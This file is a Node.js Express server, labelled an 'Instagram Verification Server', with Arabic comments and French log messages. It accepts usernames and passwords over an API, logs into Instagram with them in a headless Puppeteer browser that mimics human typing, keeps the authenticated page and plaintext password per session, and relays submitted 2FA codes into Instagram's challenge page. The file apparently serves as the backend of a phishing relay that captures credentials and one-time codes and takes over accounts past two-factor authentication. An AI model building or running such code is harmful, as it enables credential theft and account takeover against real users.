const express = require('express');
const puppeteer = require('puppeteer');
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ==================== متصفح واحد يعمل طوال الوقت ====================
let browser = null;
let mainPage = null;
let isBrowserReady = false;

// تشغيل المتصفح مرة واحدة عند بدء السيرفر
async function initBrowser() {
    if (!browser) {
        console.log('🚀 [SERVER] Lancement du navigateur (une seule fois)...');
        browser = await puppeteer.launch({
            headless: true,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-accelerated-2d-canvas',
                '--disable-gpu',
                '--window-size=1920,1080'
            ]
        });
        
        mainPage = await browser.newPage();
        await mainPage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
        await mainPage.setViewport({ width: 1920, height: 1080 });
        
        isBrowserReady = true;
        console.log('✅ [SERVER] Navigateur prêt et en attente des requêtes');
    }
    return { browser, page: mainPage };
}

// تخزين الجلسات (لكل مستخدم صفحة منفصلة داخل نفس المتصفح)
let sessions = new Map();

// ==================== إنشاء صفحة جديدة لكل جلسة ====================
async function createNewPage() {
    await initBrowser();
    const newPage = await browser.newPage();
    await newPage.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36');
    await newPage.setViewport({ width: 1920, height: 1080 });
    return newPage;
}

// ==================== 1. التحقق من الباسورد ====================
async function checkPassword(username, password, sessionId) {
    console.log(`🔍 [${sessionId}] Vérification mot de passe: ${username}`);
    
    let sessionPage = null;
    try {
        sessionPage = await createNewPage();
        
        // الذهاب إلى Instagram
        await sessionPage.goto('https://www.instagram.com/accounts/login/', {
            waitUntil: 'networkidle2',
            timeout: 30000
        });
        
        await sessionPage.waitForSelector('input[name="username"]', { timeout: 10000 });
        
        await sessionPage.type('input[name="username"]', username, { delay: 100 + Math.random() * 100 });
        await sessionPage.type('input[name="password"]', password, { delay: 100 + Math.random() * 100 });
        
        await sessionPage.click('button[type="submit"]');
        
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        const currentUrl = sessionPage.url();
        console.log(`📍 [${sessionId}] URL: ${currentUrl}`);
        
        sessions.set(sessionId, { page: sessionPage, username, password, step: 'waiting', createdAt: Date.now() });
        
        if (currentUrl.includes('challenge')) {
            sessions.set(sessionId, { page: sessionPage, username, password, step: 'otp_required', createdAt: Date.now() });
            return { success: false, step: 'otp_required', message: 'Code 2FA requis', sessionId };
        } else if (currentUrl.includes('accounts/login')) {
            await sessionPage.close();
            sessions.delete(sessionId);
            return { success: false, step: 'failed', message: 'Mot de passe incorrect' };
        } else if (currentUrl.includes('accounts/suspended')) {
            await sessionPage.close();
            sessions.delete(sessionId);
            return { success: false, step: 'suspended', message: 'Compte suspendu' };
        } else {
            sessions.set(sessionId, { page: sessionPage, username, password, step: 'logged_in', createdAt: Date.now() });
            return { success: true, step: 'success', message: 'Connexion réussie', sessionId };
        }
        
    } catch (error) {
        console.error(`❌ [${sessionId}] Erreur:`, error.message);
        if (sessionPage) await sessionPage.close();
        sessions.delete(sessionId);
        return { success: false, step: 'error', message: error.message };
    }
}

// ==================== 2. التحقق من رقم الهاتف ====================
function verifyPhoneNumber(phone) {
    if (!phone || typeof phone !== 'string') {
        return { success: false, message: 'Numéro invalide' };
    }
    
    const digits = phone.replace(/\D/g, '');
    if (digits.length < 10 || digits.length > 13) {
        return { success: false, message: 'Le numéro doit contenir 10 à 13 chiffres' };
    }
    
    const lastTwo = digits.slice(-2);
    if (lastTwo === '61') {
        return { success: true, message: 'Numéro valide ✓' };
    } else {
        return { success: false, message: 'Le numéro doit se terminer par 61' };
    }
}

// ==================== 3. التحقق من رمز OTP ====================
async function verifyOTP(otpCode, sessionId) {
    console.log(`🔑 [${sessionId}] Vérification OTP: ${otpCode}`);
    
    const session = sessions.get(sessionId);
    if (!session || !session.page) {
        return { success: false, message: 'Session expirée, veuillez réessayer' };
    }
    
    try {
        const page = session.page;
        
        await page.waitForSelector('input[name="verificationCode"]', { timeout: 10000 });
        
        await page.evaluate(() => {
            const input = document.querySelector('input[name="verificationCode"]');
            if (input) input.value = '';
        });
        
        await page.type('input[name="verificationCode"]', otpCode, { delay: 100 + Math.random() * 100 });
        
        const confirmButton = await page.$('button[type="submit"]');
        if (confirmButton) await confirmButton.click();
        
        await new Promise(resolve => setTimeout(resolve, 5000));
        
        const currentUrl = page.url();
        console.log(`📍 [${sessionId}] URL après OTP: ${currentUrl}`);
        
        if (currentUrl.includes('challenge')) {
            return { success: false, message: 'Code incorrect, réessayez' };
        } else if (currentUrl.includes('accounts/login')) {
            return { success: false, message: 'Échec de vérification' };
        } else {
            sessions.set(sessionId, { ...session, step: 'logged_in' });
            return { success: true, message: 'Code vérifié avec succès ✓' };
        }
        
    } catch (error) {
        console.error(`❌ [${sessionId}] Erreur OTP:`, error.message);
        return { success: false, message: error.message };
    }
}

// ==================== إنشاء معرف جلسة ====================
function generateSessionId() {
    return Date.now().toString(36) + Math.random().toString(36).substring(2);
}

// ==================== نقاط API ====================

// التحقق من الباسورد
app.post('/api/check-password', async (req, res) => {
    const { username, password } = req.body;
    const sessionId = generateSessionId();
    
    console.log(`📨 /api/check-password - Username: ${username}`);
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Username et password requis' });
    }
    
    const result = await checkPassword(username, password, sessionId);
    res.json(result);
});

// التحقق من رقم الهاتف
app.post('/api/verify-phone', (req, res) => {
    const { phone } = req.body;
    console.log(`📨 /api/verify-phone - Phone: ${phone}`);
    
    if (!phone) {
        return res.status(400).json({ success: false, message: 'Numéro requis' });
    }
    
    const result = verifyPhoneNumber(phone);
    res.json(result);
});

// التحقق من OTP
app.post('/api/verify-otp', async (req, res) => {
    const { code, sessionId } = req.body;
    console.log(`📨 /api/verify-otp - Code: ${code}`);
    
    if (!code) {
        return res.status(400).json({ success: false, message: 'Code requis' });
    }
    
    if (!sessionId) {
        return res.status(400).json({ success: false, message: 'Session invalide' });
    }
    
    const result = await verifyOTP(code, sessionId);
    res.json(result);
});

// حالة الجلسة
app.get('/api/session-status/:sessionId', (req, res) => {
    const { sessionId } = req.params;
    const session = sessions.get(sessionId);
    
    if (!session) {
        return res.json({ exists: false, step: 'expired' });
    }
    
    res.json({ exists: true, step: session.step, username: session.username });
});

// نقطة صحية لإبقاء السيرفر مستيقظاً
app.get('/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        browserReady: isBrowserReady,
        activeSessions: sessions.size,
        uptime: process.uptime()
    });
});

// الصفحة الرئيسية
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        message: 'Instagram Verification Server',
        browserReady: isBrowserReady,
        activeSessions: sessions.size,
        endpoints: {
            'POST /api/check-password': { body: { username, password } },
            'POST /api/verify-phone': { body: { phone } },
            'POST /api/verify-otp': { body: { code, sessionId } },
            'GET /api/session-status/:sessionId': null,
            'GET /health': 'Keep server alive'
        }
    });
});

// تنظيف الجلسات القديمة كل ساعة
setInterval(async () => {
    const now = Date.now();
    for (const [id, session] of sessions.entries()) {
        if (session.createdAt && (now - session.createdAt) > 3600000) {
            if (session.page) await session.page.close();
            sessions.delete(id);
            console.log(`🧹 [CLEANUP] Session expirée supprimée: ${id}`);
        }
    }
}, 3600000);

// ==================== تشغيل السيرفر ====================
const PORT = process.env.PORT || 3000;

app.listen(PORT, async () => {
    console.log(`\n🚀 Serveur démarré sur http://localhost:${PORT}`);
    console.log(`📌 Points d'accès API:`);
    console.log(`   POST /api/check-password`);
    console.log(`   POST /api/verify-phone`);
    console.log(`   POST /api/verify-otp`);
    console.log(`   GET  /api/session-status/:sessionId`);
    console.log(`   GET  /health\n`);
    
    // تشغيل المتصفح مرة واحدة عند بدء السيرفر
    await initBrowser();
    console.log('🌐 Navigateur prêt et en attente...');
});